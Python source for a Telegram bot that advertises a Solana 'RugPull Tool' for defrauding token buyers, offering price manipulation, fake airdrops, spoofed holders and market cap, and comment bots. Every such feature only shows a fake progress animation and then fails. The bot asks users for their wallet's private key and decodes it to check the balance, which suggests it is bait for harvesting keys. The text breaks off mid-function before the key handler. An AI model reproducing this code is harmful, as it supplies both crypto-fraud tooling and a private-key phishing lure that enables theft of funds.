from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.ext import ConversationHandler, MessageHandler, filters
import asyncio
from solana.keypair import Keypair
from solana.rpc.async_api import AsyncClient
import ast 
import base58
import time
import random
import aiohttp


BOT_START_TIME = time.time()

def get_uptime():
    seconds = int(time.time() - BOT_START_TIME)
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"

async def get_sol_to_eur_rate():
    """Fetch current SOL/EUR exchange rate from CoinGecko API"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=eur',
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('solana', {}).get('eur')
    except Exception as e:
        print(f"Error fetching SOL/EUR rate: {e}")
    return None

async def _delete_active_prompts(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    """Delete any tracked prompt message IDs to keep chat clean."""
    keys = [
        "comment_bot_msg_id", "fake_airdrop_msg_id", "spoofed_holders_msg_id",
        "spoofed_marketcap_msg_id", "mint_prompt_msg_id", "addliq_prompt_msg_id",
        "remlq_prompt_msg_id", "burn_prompt_msg_id", "price_msg_id"
    ]
    for k in keys:
        msg_id = context.user_data.get(k)
        if msg_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass
            context.user_data[k] = None


def _reset_awaiting_flags(context, except_flag=None):
    flags = [
        "awaiting_comment_bot", "awaiting_fake_airdrop", "awaiting_spoofed_holders",
        "awaiting_spoofed_marketcap", "awaiting_addliq", "awaiting_remlq",
        "awaiting_mint", "awaiting_burn", "awaiting_feedback", "awaiting_private_key"
    ]
    for flag in flags:
        context.user_data[flag] = (flag == except_flag)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if update.effective_chat.type == "private":
        for key in [
            "main_menu_msg_id", "tutorial_msg_id", "tutorial_video_id", "feedback_msg_id",
            "settings_msg_id", "comment_bot_msg_id", "fake_airdrop_msg_id", "addliq_prompt_msg_id",
            "remlq_prompt_msg_id", "mint_prompt_msg_id", "burn_prompt_msg_id", "price_msg_id",
            "rugpull_menu_msg_id"
        ]:
            msg_id = context.user_data.get(key)
            if msg_id:
                try:
                    await context.bot.delete_message(chat_id, msg_id)
                except Exception:
                    pass
                context.user_data[key] = None

    user_name = update.effective_user.first_name or "there"
    uptime = get_uptime()
    welcome_message = (
        f"😈 *Welcome, {user_name}\\!*\n"
        "Get started with deploying, managing, and rugging your coins instantly\\.\n"
        "\n"
        "*1️⃣ Create A Token*\n"
        "Go to pump\\.fun\\/create \\(or your preferred launchpad\\) and mint your SPL token with name, ticker, image, and supply\\.\n\n"
        "*2️⃣ Sync Token*\n"
        "Connect the wallet that created the token to the tool\\. This step is necessary to designate it as the Dev Wallet and allow use of the rugpull features\\.\n\n"
        "*3️⃣ Use The Rugpull Tool*\n"
        "Use the Rugpull Tool to add or remove liquidity, adjust the token supply, execute micro buys and sells, dump the token, and perform other operations\\.\n\n"
        f"🟢 Uptime: `{uptime}`"
    )

    keyboard = [
        [
            InlineKeyboardButton("🆕 Create Token", callback_data="create_token"),
            InlineKeyboardButton("🔗 Sync Token", callback_data="link_token")
        ],
        [
            InlineKeyboardButton("💣 RugPull Tool", callback_data="rugpull_tool"),
            InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_image_url = "https://raw.githubusercontent.com/pogoprints/RugLaunch/main/IMG_1371.jpeg"

    if update.message:
        try:
            sent = await update.message.reply_photo(
                photo=welcome_image_url,
                caption=welcome_message,
                parse_mode="MarkdownV2",
                reply_markup=reply_markup
            )
            context.user_data["main_menu_msg_id"] = sent.message_id
        except Exception as e:
            print(f"Error sending welcome image: {e}")
            sent = await update.message.reply_markdown_v2(
                welcome_message,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            context.user_data["main_menu_msg_id"] = sent.message_id
    elif update.callback_query:
        try:
            sent = await update.callback_query.message.chat.send_photo(
                photo=welcome_image_url,
                caption=welcome_message,
                parse_mode="MarkdownV2",
                reply_markup=reply_markup
            )
            context.user_data["main_menu_msg_id"] = sent.message_id
        except Exception as e:
            print(f"Error sending welcome image: {e}")
            sent = await update.callback_query.message.chat.send_message(
                welcome_message,
                parse_mode="MarkdownV2",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            context.user_data["main_menu_msg_id"] = sent.message_id

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query

    if query.data == "fake_website":
        await query.answer("Coming Soon!", show_alert=True)
        return

    elif query.data == "fake_socials":
        await query.answer("Coming Soon!", show_alert=True)
        return

    await query.answer()
    
    if query.data == "create_token":
        try:
            await query.message.delete()
        except Exception:
            pass
            
        text = (
            "🪙 *Go to pump\\.fun\\/create to set up and launch your very own Solana token quickly and easily.*\n\n"
            "_🎥 Not sure how to create your token\\? Watch the video above\\!_"
        )
        done_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="done")]
        ])

        video_url = "https://dl.dropboxusercontent.com/scl/fi/p6dedxhu6xwtz5e4egd1y/Video-19.01.26-21-36-56.mp4?rlkey=wwsh87rh8j14ic3aybm4a7l4k&st=jkr6pz0r&dl=1"
        sent_video = await query.message.chat.send_video(
            video_url,
            caption=text,
            parse_mode="MarkdownV2",
            reply_markup=done_keyboard
        )
        context.user_data["tutorial_video_id"] = sent_video.message_id
        
    elif query.data == "done":
        msg_id = context.user_data.get("tutorial_msg_id")
        vid_id = context.user_data.get("tutorial_video_id")
        chat_id = query.message.chat_id
        if msg_id:
            try:
                await context.bot.delete_message(chat_id, msg_id)
            except Exception:
                pass
        if vid_id:
            try:
                await context.bot.delete_message(chat_id, vid_id)
            except Exception:
                pass
        await start(update, context)

    elif query.data == "link_token":
        main_menu_id = context.user_data.get("main_menu_msg_id")
        chat_id = query.message.chat_id
        if main_menu_id:
            try:
                await context.bot.delete_message(chat_id, main_menu_id)
            except Exception:
                pass

        prompt = (
            "🔑 <b>Please input the private key associated with the wallet that created the token.</b>\n\n"
            "<i>🎥 Can't find your private key? Watch the video above!</i>"
        )
        back_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ])
        
        video_url = "https://dl.dropboxusercontent.com/scl/fi/i8smitlxl657tbmawdino/Video-19.01.26-21-29-20.mp4?rlkey=kkczje4bcyybtgq4qawrp2m8y&st=jjzykqu2&dl=1"
        
        try:
            sent_video = await query.message.chat.send_video(
                video_url,
                caption=prompt,
                parse_mode="HTML",
                reply_markup=back_keyboard
            )
            context.user_data["main_menu_msg_id"] = sent_video.message_id
            context.user_data["awaiting_private_key"] = True
        except Exception as e:
            print(f"Error sending sync token video: {e}")
            fallback_prompt = (
                "🔑 <b>Please input the private key associated with the wallet that created the token.</b>\n\n"
                f"<i>🎥 Watch the tutorial: <a href='{video_url}'>Click here</a></i>"
            )
            sent = await query.message.chat.send_message(
                fallback_prompt,
                parse_mode="HTML",
                reply_markup=back_keyboard
            )
            context.user_data["main_menu_msg_id"] = sent.message_id
            context.user_data["awaiting_private_key"] = True

    elif query.data == "back_to_menu":
        try:
            await query.message.delete()
        except Exception:
            pass
        
        await start(update, context)
        return

    elif query.data == "settings":
        try:
            await query.message.delete()
        except Exception:
            pass
        
        alerts_enabled = context.user_data.get("alerts_enabled", False)
        alert_button = InlineKeyboardButton(
            "🟢 Disable Notifications" if alerts_enabled else "🔴 Enable Notifications",
            callback_data="toggle_alerts"
        )
        settings_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Restart Bot", callback_data="restart")],
            [alert_button],
            [InlineKeyboardButton("🌐 Change Language", callback_data="change_language")],
            [InlineKeyboardButton("📝 Feedback", callback_data="feedback")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ])
        sent = await query.message.chat.send_message(
            "⚙️ Manage Settings",
            reply_markup=settings_keyboard
        )
        context.user_data["settings_msg_id"] = sent.message_id

    elif query.data == "restart":
        settings_msg_id = context.user_data.get("settings_msg_id")
        chat_id = query.message.chat_id
        if settings_msg_id:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=settings_msg_id,
                    text="🔄 Restarting bot..."
                )
            except Exception:
                pass
            await asyncio.sleep(2.2)
            try:
                await context.bot.delete_message(chat_id, settings_msg_id)
            except Exception:
                pass
            await start(update, context)
        else:
            await start(update, context)
        return

    elif query.data == "toggle_alerts":
        alerts_enabled = context.user_data.get("alerts_enabled", False)
        context.user_data["alerts_enabled"] = not alerts_enabled
        alert_button = InlineKeyboardButton(
            "🟢 Disable Notifications" if not alerts_enabled else "🔴 Enable Notifications",
            callback_data="toggle_alerts"
        )
        settings_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Restart Bot", callback_data="restart")],
            [alert_button],
            [InlineKeyboardButton("🌐 Change Language", callback_data="change_language")],
            [InlineKeyboardButton("📝 Feedback", callback_data="feedback")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ])
        await query.message.edit_text(
            "⚙️ Manage Settings",
            reply_markup=settings_keyboard
        )
        
    elif query.data == "feedback":
        context.user_data["awaiting_feedback"] = True
        feedback_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="settings")]
        ])
        sent = await query.message.edit_text(
            "📝 We'd love to hear your feedback!\nPlease type your message below and send it.",
            reply_markup=feedback_keyboard
        )
        context.user_data["feedback_msg_id"] = sent.message_id

    elif query.data == "comment_bot":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_comment_bot")
        comment_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "💬 How many comments should I drop? (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
            parse_mode="HTML",
            reply_markup=comment_keyboard
        )
        context.user_data["comment_bot_msg_id"] = sent.message_id
        return

    elif query.data == "fake_airdrop":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_fake_airdrop")
        fake_airdrop_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "🎁 Please enter the number of fake airdrops you'd like to distribute: (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
            parse_mode="HTML",
            reply_markup=fake_airdrop_keyboard
        )
        context.user_data["fake_airdrop_msg_id"] = sent.message_id
        return

    elif query.data == "spoofed_holders":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_spoofed_holders")
        spoofed_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "👤 How many spoofed holders would you like? (e.g. <code>5</code>, <code>10</code>, <code>20</code>)",
            parse_mode="HTML",
            reply_markup=spoofed_keyboard
        )
        context.user_data["spoofed_holders_msg_id"] = sent.message_id
        return

    elif query.data == "back_price_manipulation":
        price_msg_id = context.user_data.get("price_msg_id")
        chat_id = query.message.chat_id
        if price_msg_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=price_msg_id)
            except Exception:
                pass
            context.user_data["price_msg_id"] = None
        return

    elif query.data == "spoofed_marketcap":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_spoofed_marketcap")
        marketcap_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "📊 How much spoofed market cap would you like to display? (e.g. <code>50000</code>, <code>1000000</code>, <code>25000000</code>)",
            parse_mode="HTML",
            reply_markup=marketcap_keyboard
        )
        context.user_data["spoofed_marketcap_msg_id"] = sent.message_id
        return

    elif query.data == "change_language":
        sent = await query.message.reply_text(
            "Language change in the bot isn't available yet. Please change it in your system settings for now."
        )
        await asyncio.sleep(2.7)
        try:
            await context.bot.delete_message(chat_id=sent.chat_id, message_id=sent.message_id)
        except Exception:
            pass
        return

    elif query.data == "rugpull_tool":
        try:
            try:
                await query.message.delete()
            except Exception:
                pass

            sent = await query.message.chat.send_message("Loading... (0%)")

            steps = [
                ("Loading", 10, 35),
                ("Syncing Token", 35, 75),
                ("Sync Failed", 75, 85),
                ("Launching RugPull Tool", 85, 100)
            ]
            percent_points = []
            for text, start_pct, end in steps:
                percent = start_pct
                while percent < end:
                    if random.random() < 0.18:
                        run_length = random.randint(2, 5)
                        for _ in range(run_length):
                            if percent >= end:
                                break
                            percent_points.append((text, percent))
                            percent += 1
                    else:
                        percent_points.append((text, percent))
                        percent += 5
                percent_points.append((text, end))

            total_time = random.uniform(4.0, 6.0)
            sleep_per_step = total_time / len(percent_points)

            pause_indices = random.sample(range(2, len(percent_points)-2), k=2)
            for idx, (text, percent) in enumerate(percent_points):
                dots = "." * ((percent % 3) + 1)
                await sent.edit_text(f"{text}{dots} ({percent}%)")
                await asyncio.sleep(sleep_per_step)
                if idx in pause_indices:
                    await asyncio.sleep(random.uniform(0.25, 0.5))

            await sent.edit_text("Launching RugPull Tool... (100%)")
            await asyncio.sleep(1)

            minting_enabled = context.user_data.get("minting_enabled", False)
            minting_button = InlineKeyboardButton(
                "🟢 Automatic RugPull" if minting_enabled else "🔴 Automatic RugPull",
                callback_data="toggle_minting"
            )
            rugpull_keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🪙 Mint Token", callback_data="mint_token"),
                    InlineKeyboardButton("🔥 Burn Token", callback_data="burn_token")
                ],
                [minting_button],
                [
                    InlineKeyboardButton("⚡ Instant Rugpull", callback_data="instant_rugpull"),
                    InlineKeyboardButton("🐢 Slow Rugpull", callback_data="slow_rugpull")
                ],
                [
                    InlineKeyboardButton("💧 Add Liquidity", callback_data="add_liquidity"),
                    InlineKeyboardButton("🧹 Remove Liquidity", callback_data="remove_liquidity")
                ],
                [
                    InlineKeyboardButton("📈 Price Manipulation", callback_data="price_manipulation")
                ],
                [
                    InlineKeyboardButton("🔴 Micro Buy", callback_data="micro_buy"),
                    InlineKeyboardButton("🔴 Micro Sell", callback_data="micro_sell"),
                    InlineKeyboardButton("🔴 Micro Dynamic", callback_data="micro_dynamic")
                ],
                [
                    InlineKeyboardButton("🤖 Comment Bot", callback_data="comment_bot"),
                    InlineKeyboardButton("🎁 Fake Airdrop", callback_data="fake_airdrop"),
                    InlineKeyboardButton("👤 Spoofed Holders", callback_data="spoofed_holders"),
                    InlineKeyboardButton("📊 Spoofed Market Cap", callback_data="spoofed_marketcap")
                ],
                [
                    InlineKeyboardButton("🌐 Fake Website", callback_data="fake_website"),
                    InlineKeyboardButton("📱 Fake Socials", callback_data="fake_socials")
                ],
                [
                    InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
                ]
            ])
            await sent.edit_text(
                "<code>🆔 Bot Version: v1.1.0</code>",
                parse_mode="HTML",
                reply_markup=rugpull_keyboard
            )
        except Exception:
            pass
        return

    elif query.data == "help_troubleshoot":
        faq_text = (
            "💬 <b>Frequently Asked Questions</b>\n\n"
            "<b>Q: Why do I need a minimum of 0.25 SOL?</b>\n"
            "A: You need at least 0.25 SOL to cover transaction fees and network costs. This ensures your transactions process smoothly without delays or failures.\n\n"
            "<b>Q: Can I use other platforms besides Pump.fun to launch a token?</b>\n"
            "A: Yes, you can use other platforms — but the bot currently only supports Pump.fun for token launches.\n\n"
            "<b>Q: Can I create a token for free?</b>\n"
            "A: Yes! It's completely free to create a token.\n\n"
            "<b>Q: How do micro buys, sells, and dynamic mode work?</b>\n"
            "A: The bot automatically creates 18 bundled wallets for you. It then sends 0.1 SOL from your developer wallet to each bundled wallet. After that, it starts performing micro buys or micro sells, depending on which option you choose."
        )
        faq_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]
        ])
        await query.message.edit_text(
            faq_text,
            parse_mode="HTML",
            reply_markup=faq_keyboard
        )
        return

    elif query.data in [
        "tone_hype", "tone_meme", "tone_smart",
        "tone_chill", "tone_spicy", "tone_chaotic"
    ]:
        comment_bot_msg_id = context.user_data.get("comment_bot_msg_id")
        chat_id = query.message.chat_id

        processing_texts = ["🔄 Processing request.", "🔄 Processing request..", "🔄 Processing request..."]
        dot_count = random.choice([2, 3, 4])
        for i in range(dot_count):
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=comment_bot_msg_id,
                text=processing_texts[i % 3]
            )
            await asyncio.sleep(0.8)

        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=comment_bot_msg_id,
            text="❌ Cannot generate comments. No token found."
        )
        await asyncio.sleep(2.2)

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=comment_bot_msg_id)
        except Exception:
            pass
        context.user_data["comment_bot_msg_id"] = None
        return

    elif query.data == "toggle_minting":
        minting_enabled = context.user_data.get("minting_enabled", False)
        context.user_data["minting_enabled"] = not minting_enabled
        minting_enabled = context.user_data.get("minting_enabled", False)
        minting_button = InlineKeyboardButton(
            "🟢 Automatic RugPull" if minting_enabled else "🔴 Automatic RugPull",
            callback_data="toggle_minting"
        )
        rugpull_keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🪙 Mint Token", callback_data="mint_token"),
                InlineKeyboardButton("🔥 Burn Token", callback_data="burn_token")
            ],
            [
                minting_button
            ],
            [
                InlineKeyboardButton("⚡ Instant Rugpull", callback_data="instant_rugpull"),
                InlineKeyboardButton("🐢 Slow Rugpull", callback_data="slow_rugpull")
            ],
            [
                InlineKeyboardButton("💧 Add Liquidity", callback_data="add_liquidity"),
                InlineKeyboardButton("🧹 Remove Liquidity", callback_data="remove_liquidity")
            ],
            [
                InlineKeyboardButton("📈 Price Manipulation", callback_data="price_manipulation")
            ],
            [
                InlineKeyboardButton("🔴 Micro Buy", callback_data="micro_buy"),
                InlineKeyboardButton("🔴 Micro Sell", callback_data="micro_sell"),
                InlineKeyboardButton("🔴 Micro Dynamic", callback_data="micro_dynamic")
            ],
            [
                InlineKeyboardButton("🤖 Comment Bot", callback_data="comment_bot"),
                InlineKeyboardButton("🎁 Fake Airdrop", callback_data="fake_airdrop"),
                InlineKeyboardButton("👤 Spoofed Holders", callback_data="spoofed_holders"),
                InlineKeyboardButton("📊 Spoofed Market Cap", callback_data="spoofed_marketcap")
            ],
            [
                InlineKeyboardButton("🌐 Fake Website", callback_data="fake_website"),
                InlineKeyboardButton("📱 Fake Socials", callback_data="fake_socials")
            ],
            [
                InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
            ]
        ])
        await query.message.edit_text(
            "<code>🆔 Bot Version: v1.1.0</code>",
            parse_mode="HTML",
            reply_markup=rugpull_keyboard
        )
        return

    elif query.data in ["instant_rugpull", "slow_rugpull"]:
        sent = await query.message.reply_text("🔄 Processing request…")
        dot_count = random.choice([2, 3])
        for i in range(dot_count):
            await sent.edit_text(f"🔄 Processing request{'.' * (i+1)}")
            await asyncio.sleep(0.8)
        await asyncio.sleep(0.8)
        await sent.edit_text("❌ No token found.")
        await asyncio.sleep(1.5)
        try:
            await sent.delete()
        except Exception:
            pass
        return

    elif query.data == "price_manipulation":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, None)
        price_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔻 25% decrease", callback_data="price_drop_25")],
            [InlineKeyboardButton("🔻 50% decrease", callback_data="price_drop_50")],
            [InlineKeyboardButton("🔻 75% decrease", callback_data="price_drop_75")],
            [InlineKeyboardButton("🔻 100% decrease", callback_data="price_drop_100")],
            [InlineKeyboardButton("❌ Cancel", callback_data="back_price_manipulation")]
        ])
        sent = await query.message.chat.send_message(
            "📉 How much would you like the price to drop?",
            reply_markup=price_keyboard
        )
        context.user_data["price_msg_id"] = sent.message_id
        return

    elif query.data in ["price_drop_25", "price_drop_50", "price_drop_75", "price_drop_100"]:
        price_msg_id = context.user_data.get("price_msg_id")
        chat_id = query.message.chat_id

        if price_msg_id:
            dot_count = random.choice([2, 3])
            for i in range(dot_count):
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=price_msg_id,
                    text=f"📉 Executing drop{'.' * (i+1)}"
                )
                await asyncio.sleep(0.8)
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=price_msg_id,
                text="❌ Drop failed. No token found."
            )
            await asyncio.sleep(1.5)
            try:
                await context.bot.delete_message(
                    chat_id=chat_id,
                    message_id=price_msg_id
                )
            except Exception:
                pass
            context.user_data["price_msg_id"] = None
        else:
            sent_error = await query.message.reply_text("❌ Drop failed. No token found.")
            await asyncio.sleep(1.5)
            try:
                await sent_error.delete()
            except Exception:
                pass
        return

    elif query.data == "mint_token":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_mint")
        mint_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "🪙 How many tokens would you like to mint? (e.g., <code>1000</code> or <code>10000000</code>)",
            parse_mode="HTML",
            reply_markup=mint_keyboard
        )
        context.user_data["mint_prompt_msg_id"] = sent.message_id
        context.user_data["awaiting_mint"] = True
        return
        
    elif query.data == "add_liquidity":
        addliq_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "💧 How much liquidity would you like to add? (e.g. <code>10 SOL</code>):",
            parse_mode="HTML",
            reply_markup=addliq_keyboard
        )
        context.user_data["addliq_prompt_msg_id"] = sent.message_id
        context.user_data["awaiting_addliq"] = True
        return

    elif query.data == "remove_liquidity":
        remlq_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "🧹 How much liquidity would you like to remove? (e.g. <code>10 SOL</code>):",
            parse_mode="HTML",
            reply_markup=remlq_keyboard
        )
        context.user_data["remlq_prompt_msg_id"] = sent.message_id
        context.user_data["awaiting_remlq"] = True
        return

    elif query.data == "burn_token":
        await _delete_active_prompts(context, query.message.chat_id)
        _reset_awaiting_flags(context, "awaiting_burn")
        burn_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])
        sent = await query.message.chat.send_message(
            "🔥 How many tokens would you like to burn? (e.g. <code>1000</code> or <code>10000000</code>)",
            parse_mode="HTML",
            reply_markup=burn_keyboard
        )
        context.user_data["burn_prompt_msg_id"] = sent.message_id
        context.user_data["awaiting_burn"] = True
        return

    elif query.data == "back_to_rugpull":
        prompt_keys = [
            ("comment_bot_msg_id", "awaiting_comment_bot"),
            ("fake_airdrop_msg_id", "awaiting_fake_airdrop"),
            ("spoofed_holders_msg_id", "awaiting_spoofed_holders"),
            ("spoofed_marketcap_msg_id", "awaiting_spoofed_marketcap"),
            ("addliq_prompt_msg_id", "awaiting_addliq"),
            ("remlq_prompt_msg_id", "awaiting_remlq"),
            ("mint_prompt_msg_id", "awaiting_mint"),
            ("burn_prompt_msg_id", "awaiting_burn"),
        ]
        for msg_key, flag_key in prompt_keys:
            msg_id = context.user_data.get(msg_key)
            if msg_id:
                try:
                    await context.bot.delete_message(chat_id=query.message.chat_id, message_id=msg_id)
                except Exception:
                    pass
                context.user_data[msg_key] = None
            if flag_key:
                context.user_data[flag_key] = False
        return

    elif query.data in ["micro_buy", "micro_sell", "micro_dynamic"]:
        if query.data == "micro_buy":
            context.user_data["micro_buy_active"] = not context.user_data.get("micro_buy_active", False)
            context.user_data["micro_sell_active"] = False
            context.user_data["micro_dynamic_active"] = False
        elif query.data == "micro_sell":
            context.user_data["micro_sell_active"] = not context.user_data.get("micro_sell_active", False)
            context.user_data["micro_buy_active"] = False
            context.user_data["micro_dynamic_active"] = False
        elif query.data == "micro_dynamic":
            context.user_data["micro_dynamic_active"] = not context.user_data.get("micro_dynamic_active", False)
            context.user_data["micro_buy_active"] = False
            context.user_data["micro_sell_active"] = False

        minting_enabled = context.user_data.get("minting_enabled", False)
        minting_button = InlineKeyboardButton(
            "🟢 Automatic RugPull" if minting_enabled else "🔴 Automatic RugPull",
            callback_data="toggle_minting"
        )

        micro_buy_label = "🟢 Micro Buy" if context.user_data.get("micro_buy_active") else "🔴 Micro Buy"
        micro_sell_label = "🟢 Micro Sell" if context.user_data.get("micro_sell_active") else "🔴 Micro Sell"
        micro_dynamic_label = "🟢 Micro Dynamic" if context.user_data.get("micro_dynamic_active") else "🔴 Micro Dynamic"

        rugpull_keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🪙 Mint Token", callback_data="mint_token"),
                InlineKeyboardButton("🔥 Burn Token", callback_data="burn_token")
            ],
            [
                minting_button
            ],
            [
                InlineKeyboardButton("⚡ Instant Rugpull", callback_data="instant_rugpull"),
                InlineKeyboardButton("🐢 Slow Rugpull", callback_data="slow_rugpull")
            ],
            [
                InlineKeyboardButton("💧 Add Liquidity", callback_data="add_liquidity"),
                InlineKeyboardButton("🧹 Remove Liquidity", callback_data="remove_liquidity")
            ],
            [
                InlineKeyboardButton("📈 Price Manipulation", callback_data="price_manipulation")
            ],
            [
                InlineKeyboardButton(micro_buy_label, callback_data="micro_buy"),
                InlineKeyboardButton(micro_sell_label, callback_data="micro_sell"),
                InlineKeyboardButton(micro_dynamic_label, callback_data="micro_dynamic")
            ],
            [
                InlineKeyboardButton("🤖 Comment Bot", callback_data="comment_bot"),
                InlineKeyboardButton("🎁 Fake Airdrop", callback_data="fake_airdrop"),
                InlineKeyboardButton("👤 Spoofed Holders", callback_data="spoofed_holders"),
                InlineKeyboardButton("📊 Spoofed Market Cap", callback_data="spoofed_marketcap")
            ],
            [
                InlineKeyboardButton("🌐 Fake Website", callback_data="fake_website"),
                InlineKeyboardButton("📱 Fake Socials", callback_data="fake_socials")
            ],
            [
                InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
            ]
        ])
        await query.message.edit_text(
            "<code>🆔 Bot Version: v1.1.0</code>",
            parse_mode="HTML",
            reply_markup=rugpull_keyboard
        )
        return


CHANNEL_ID = -5198006747

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
    except Exception:
        pass

    sent = await update.effective_chat.send_message(
        "Hey there, free access for everyone until 31st October, no key needed."
    )
    await asyncio.sleep(2.2)
    try:
        await context.bot.delete_message(chat_id=sent.chat_id, message_id=sent.message_id)
    except Exception:
        pass


async def get_wallet_balance(private_key: str):
    try:
        secret = None
        try:
            secret = bytes.fromhex(private_key)
        except ValueError:
            try:
                arr = ast.literal_eval(private_key)
                secret = bytes(arr)
            except Exception:
                secret = base58.b58decode(private_key)
        if secret is None or len(secret) != 64:
            print(f"Decoded secret length: {len(secret) if secret else 'None'}")
            return None
        keypair = Keypair.from_secret_key(secret)
        pubkey = keypair.public_key
        async with AsyncClient("https://api.mainnet-beta.solana.com") as client:
            resp = await client.get_balance(pubkey)
            try:
                lamports = resp.value
            except AttributeError:
                lamports = resp['result']['value']
            sol = lamports / 1_000_000_000
            return sol
    except Exception as e:
        print(f"Error in get_wallet_balance: {e}")
        return None

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    if context.user_data.get("awaiting_addliq"):
        addliq_input = update.message.text.strip()
        chat_id = update.effective_chat.id
        msg_id = update.message.message_id

        error_msg = None
        addliq_success = False
        if not addliq_input:
            error_msg = "🚫 No amount entered. Please specify the amount of liquidity to add (e.g. <code>1.5 SOL</code>)."
        elif not addliq_input.upper().endswith(" SOL"):
            error_msg = "🔢 Please enter the amount followed by 'SOL' (e.g. <code>1.5 SOL</code>)."
        else:
            try:
                amount = float(addliq_input[:-4].strip())
                if amount > 1000000000000 or amount < 0.00000001:
                    error_msg = "💧 Amount must be between 0.00000001 and 1000000000000 SOL."
                else:
                    addliq_success = True
            except ValueError:
                error_msg = "🔢 Only numbers are allowed. Please enter a valid amount (e.g. <code>1.5 SOL</code>)."

        addliq_prompt_id = context.user_data.get("addliq_prompt_msg_id")
        context.user_data["awaiting_addliq"] = False

        addliq_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_rugpull")]
        ])

        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass

        if addliq_prompt_id:
            try:
                if addliq_success:
                    for i in range(6):
                        dots = "." * (i % 4)
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=addliq_prompt_id,
                            text=f"💧 Adding liquidity{dots}",
                            parse_mode="HTML"
                        )
                        await asyncio.sleep(0.32)
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=addliq_prompt_id,
                        text="❌ Liquidity add failed. No token found.",
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
                    try:
                        await context.bot.delete_message(chat_id=chat_id, message_id=addliq_prompt_id)
                    except Exception:
                        pass
                    context.user_data["addliq_prompt_msg_id"] = None
                else:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=addliq_prompt_id,
                        text=error_msg,
                        parse_mode="HTML"
                    )
                    await asyncio.sleep(2.2)
